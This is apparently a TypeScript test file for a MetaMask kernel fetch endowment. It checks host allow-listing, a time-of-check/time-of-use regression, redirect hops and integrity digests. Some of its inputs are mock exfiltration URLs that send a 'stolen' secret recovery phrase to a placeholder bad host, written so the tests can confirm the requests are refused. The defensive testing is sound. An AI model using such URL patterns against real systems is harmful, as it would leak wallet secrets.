import { makeSQLKernelDatabase } from '@metamask/kernel-store/sqlite/nodejs';
import { waitUntilQuiescent } from '@metamask/kernel-utils';
import type { Kernel, KRef, VatId } from '@metamask/ocap-kernel';
import { getWorkerFile } from '@ocap/nodejs-test-workers';
import { describe, expect, it } from 'vitest';

import {
  extractTestLogs,
  getBundleSpec,
  makeKernel,
  makeTestLogger,
} from './utils.ts';

const vatId = 'v1' as VatId;
const v1Root = 'ko4' as KRef;
const goodHost = 'good-url.test';
const badHost = 'bad-url.test';

/**
 * Launch the endowment-fetch vat on the mock-fetch worker, granted `http` to
 * `goodHost` and its subdomains.
 *
 * @returns The kernel, and a reader of the vat's test logs.
 */
const launchFetchVat = async (): Promise<{
  kernel: Kernel;
  vatLogs: () => string[];
}> => {
  const { logger, entries } = makeTestLogger();
  const database = await makeSQLKernelDatabase({});
  const kernel = await makeKernel(
    database,
    true,
    logger,
    getWorkerFile('mock-fetch'),
  );
  await kernel.launchSubcluster({
    bootstrap: 'main',
    vats: {
      main: {
        bundleSpec: getBundleSpec('endowment-fetch'),
        parameters: {},
        globals: ['URL', 'Request', 'Headers', 'Response', 'crypto'],
        platformConfig: {
          http: { allow: [{ host: goodHost }] },
        },
      },
    },
  });
  await waitUntilQuiescent();
  return { kernel, vatLogs: () => extractTestLogs(entries, vatId) };
};

/**
 * Send a message to the vat's root and wait for the kernel to settle.
 *
 * @param kernel - The kernel to send through.
 * @param method - The method to invoke.
 * @param args - Its arguments.
 */
const send = async (
  kernel: Kernel,
  method: string,
  args: unknown[],
): Promise<void> => {
  await kernel.queueMessage(v1Root, method, args);
  await waitUntilQuiescent();
};

const refusedHost =
  'error: Error: In "request" method of (Http): arg 0: arg 1: "bad-url" - Must be: "good-url"';

describe('endowments', () => {
  it('reaches an allowed host and its subdomains, and not another', async () => {
    const { kernel, vatLogs } = await launchFetchVat();

    await send(kernel, 'hello', [`https://${goodHost}`]);
    await send(kernel, 'hello', [`https://api.${goodHost}`]);
    await expect(
      kernel.queueMessage(v1Root, 'hello', [`https://${badHost}`]),
    ).rejects.toThrow('In "request" method of (Http)');
    await waitUntilQuiescent();

    expect(vatLogs()).toStrictEqual([
      'buildRootObject',
      'bootstrap',
      'response: Hello, world!',
      'response: Hello, world!',
      refusedHost,
    ]);
  });

  // CWE-367 regression: the host checked must be the host requested.
  it.each([
    ['a plain object', false],
    ['a URL', true],
  ])(
    'refuses %s that resolves differently when read again',
    async (_, asUrl) => {
      const { kernel, vatLogs } = await launchFetchVat();

      await send(kernel, 'fetchWithTwoFacedUrl', [
        `https://${goodHost}/decoy`,
        `https://${badHost}/exfil?srp=stolen`,
        asUrl,
      ]);

      expect(vatLogs()).toStrictEqual([
        'buildRootObject',
        'bootstrap',
        'error: Error: fetch input resolved to a different URL when read again.',
        'reads: 2',
      ]);
    },
  );

  it('checks each redirect hop against the narrowing', async () => {
    const { kernel, vatLogs } = await launchFetchVat();
    const redirectFrom = (target: string): string =>
      `https://${goodHost}/start?redirectTo=${encodeURIComponent(target)}`;

    await send(kernel, 'fetchFollowingRedirect', [
      redirectFrom(`https://${badHost}/exfil?srp=stolen`),
    ]);
    await send(kernel, 'fetchFollowingRedirect', [
      redirectFrom(`https://${goodHost}/landed`),
    ]);

    expect(vatLogs()).toStrictEqual([
      'buildRootObject',
      'bootstrap',
      refusedHost,
      `fetched: https://${goodHost}/landed`,
      // The base asks the endowments' `fetch` not to follow, through the
      // Snaps wrapping; `makeFetch` followed instead.
      'redirect mode: manual',
      'redirected: true',
      'body: Hello, world!',
    ]);
  });

  // The digest is spent on the body the chain ends on, not on a hop's.
  it('checks an integrity against the resource a redirect led to', async () => {
    const { kernel, vatLogs } = await launchFetchVat();
    const landed = `https://${goodHost}/landed`;
    const start = `https://${goodHost}/start?redirectTo=${encodeURIComponent(landed)}`;
    // Of `Hello, world!`, which the mock answers `/landed` with.
    const resourceDigest =
      'sha256-MV9b23bQeMQ7isAGTkoBZGErH853yGk0W/yUx1iU7dM=';
    const otherDigest = 'sha256-LPJNul+wow4m6DsqxbninhsWHlwfp0JecwQzYpOLmCQ=';

    await send(kernel, 'fetchWithIntegrity', [start, resourceDigest]);
    await send(kernel, 'fetchWithIntegrity', [start, otherDigest]);

    expect(vatLogs()).toStrictEqual([
      'buildRootObject',
      'bootstrap',
      'body: Hello, world!',
      `error: Error: Fetch of ${landed} does not match the requested integrity \`${otherDigest}\`.`,
    ]);
  });
});
